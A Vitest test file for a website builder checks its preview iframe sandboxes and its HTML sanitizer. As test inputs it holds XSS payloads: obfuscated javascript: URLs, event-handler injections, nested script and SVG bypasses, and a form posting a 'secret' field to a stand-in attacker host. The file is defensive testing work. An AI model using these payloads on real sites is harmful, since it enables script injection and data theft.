import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  BUILDER_EDITOR_SANDBOX,
  BUILDER_PREVIEW_CSP,
  BUILDER_STANDALONE_PREVIEW_SANDBOX,
  BUILDER_VISUAL_PREVIEW_SANDBOX,
  createSandboxedBuilderPreviewDocument,
  sanitizeBuilderPreviewHtml,
} from "./website-preview-security";

const editorSource = readFileSync(
  new URL("../routes/app.site.builder.editor.$websiteId.tsx", import.meta.url),
  "utf8",
);
const previewSource = readFileSync(
  new URL("../routes/app.site.builder.preview.$websiteId.tsx", import.meta.url),
  "utf8",
);
const sitesSource = readFileSync(new URL("../routes/app.site.tsx", import.meta.url), "utf8");

describe("website builder preview execution boundary", () => {
  it("sandboxes the editable srcDoc iframe without script execution", () => {
    const iframe = editorSource.match(/<iframe[\s\S]*?srcDoc=\{safeSnapshotHtml \|\| undefined\}[\s\S]*?\/>/)?.[0];

    expect(iframe).toBeTruthy();
    expect(iframe).toContain("sandbox={BUILDER_EDITOR_SANDBOX}");
    expect(BUILDER_EDITOR_SANDBOX).toContain("allow-same-origin");
    expect(BUILDER_EDITOR_SANDBOX).not.toContain("allow-scripts");
    expect(BUILDER_EDITOR_SANDBOX).not.toContain("allow-popups-to-escape-sandbox");
  });

  it("does not open persisted HTML directly as a same-origin blob document", () => {
    expect(editorSource).not.toContain("new Blob([cleanStandalonePreviewHtml(html)]");
    expect(editorSource).not.toContain("new Blob([html], { type: \"text/html;charset=utf-8\" })");
    expect(editorSource).toContain("createSandboxedBuilderPreviewDocument");
  });

  it("sandboxes authenticated preview iframes without scripts", () => {
    expect(previewSource).toContain("sandbox={BUILDER_VISUAL_PREVIEW_SANDBOX}");
    expect(sitesSource.match(/sandbox=\{BUILDER_VISUAL_PREVIEW_SANDBOX\}/g)?.length).toBeGreaterThanOrEqual(2);
    expect(`${previewSource}\n${sitesSource}`).not.toContain("allow-scripts");
    expect(BUILDER_VISUAL_PREVIEW_SANDBOX).not.toContain("allow-scripts");
  });

  it("removes active content, unsafe navigation, form actions and dangerous CSS", () => {
    const malicious = String.raw`<!doctype html><html><head>
      <meta http-equiv="refresh" content="0;url=https://attacker.invalid">
      <style>.hero{color:#c89b3c;background:url(j\61vascript:alert(1))}.safe{padding:12px}</style>
      <script>window.top.location='https://attacker.invalid'</script>
    </head><body onload="alert(1)">
      <img src="https://images.example.test/home.jpg" onerror="alert(1)">
      <a href="jav&#x61;script:alert(1)" onclick="alert(1)" download>Link inseguro</a>
      <iframe srcdoc="<script>alert(1)</script>"></iframe>
      <form action="https://attacker.invalid/collect" method="post" target="_top">
        <input name="secret"><button type="submit" formaction="https://attacker.invalid">Enviar</button>
      </form>
    </body></html>`;

    const output = sanitizeBuilderPreviewHtml(malicious);
    const lower = output.toLowerCase();

    expect(lower).not.toContain("<script");
    expect(lower).not.toContain("onload=");
    expect(lower).not.toContain("onerror=");
    expect(lower).not.toContain("onclick=");
    expect(lower).not.toContain("javascript:");
    expect(lower).not.toContain("srcdoc=");
    expect(lower).not.toContain("<iframe");
    expect(lower).not.toContain("download=");
    expect(lower).not.toMatch(/\saction=/);
    expect(lower).not.toMatch(/\sformaction=/);
    expect(lower).not.toContain("target=\"_top\"");
    expect(lower).toContain("data-imobiflow-preview-inert=\"true\"");
    expect(lower).toContain("<button type=\"button\"");
    expect(output).toContain(BUILDER_PREVIEW_CSP);
  });

  it("blocks parser and protocol bypasses in nested HTML and SVG", () => {
    const malicious = String.raw`<!doctype html><html><body>
      <template><script>alert(1)</script><img src=x onfocus="alert(1)"></template>
      <noscript><script>alert(2)</script></noscript>
      <svg><a xlink:href="&#x6a;avascript:alert(3)">SVG</a></svg>
      <object data="data:text/html,<script>alert(4)</script>"></object>
      <a href="java&#x09;script:alert(5)" target="_top">Ofuscado</a>
      <img src="data:text/html,<script>alert(6)</script>">
    </body></html>`;

    const output = sanitizeBuilderPreviewHtml(malicious).toLowerCase();

    expect(output).not.toContain("<script");
    expect(output).not.toContain("javascript:");
    expect(output).not.toContain("onfocus=");
    expect(output).not.toContain("<object");
    expect(output).not.toContain("data:text/html");
    expect(output).not.toContain("target=\"_top\"");
  });

  it("preserves legitimate HTML, CSS, media and safe links as a visual preview", () => {
    const legitimate = `<!doctype html><html lang="pt-BR"><head><style>.hero{color:#c89b3c;padding:12px;background:url(https://cdn.example.test/hero.jpg)}</style></head><body><main class="hero"><h1>Imóveis em destaque</h1><img src="https://cdn.example.test/home.jpg" alt="Casa"><a href="https://example.test/imoveis">Ver imóveis</a><a href="#contato">Contato</a><form><input name="name" placeholder="Nome"><button>Enviar</button></form></main></body></html>`;
    const output = sanitizeBuilderPreviewHtml(legitimate);

    expect(output).toContain("Imóveis em destaque");
    expect(output).toContain("color:#c89b3c");
    expect(output).toContain('background:url("https://cdn.example.test/hero.jpg")');
    expect(output).toContain('src="https://cdn.example.test/home.jpg"');
    expect(output).toContain('href="https://example.test/imoveis"');
    expect(output).toContain('target="_blank"');
    expect(output).toContain('rel="noopener noreferrer"');
    expect(output).toContain('href="#contato"');
    expect(output).toContain('target="_self"');
    expect(output).toContain("<form");
    expect(output).toContain("<input");
  });

  it("places standalone previews inside a scriptless opaque sandbox", () => {
    const output = createSandboxedBuilderPreviewDocument(
      `<style>h1{color:navy}</style><h1 onclick="alert(1)">Preview</h1><script>alert(1)</script>`,
    );

    expect(BUILDER_STANDALONE_PREVIEW_SANDBOX).not.toContain("allow-scripts");
    expect(BUILDER_STANDALONE_PREVIEW_SANDBOX).not.toContain("allow-same-origin");
    expect(BUILDER_STANDALONE_PREVIEW_SANDBOX).not.toContain("allow-popups-to-escape-sandbox");
    expect(output).toContain(`sandbox="${BUILDER_STANDALONE_PREVIEW_SANDBOX}"`);
    expect(output).toContain("srcdoc=");
    expect(output).toContain("Preview");
    expect(output.toLowerCase()).not.toContain("<script>alert(1)</script>");
    expect(output.toLowerCase()).not.toContain("onclick=");
  });

  it("keeps custom JavaScript persistence while declaring it inert in preview", () => {
    const codeEditorSource = readFileSync(
      new URL("../routes/app.site.builder.editor.$websiteId.code.tsx", import.meta.url),
      "utf8",
    );

    expect(codeEditorSource).toContain('file("website/scripts/custom.js", "Custom JS", "javascript"');
    expect(codeEditorSource).toContain("createWebsiteBuilderCodeFile");
    expect(codeEditorSource).toContain("updateWebsiteBuilderCodeFile");
    expect(codeEditorSource).toContain("JavaScript personalizado é salvo no MySQL, mas não é executado");
  });
});
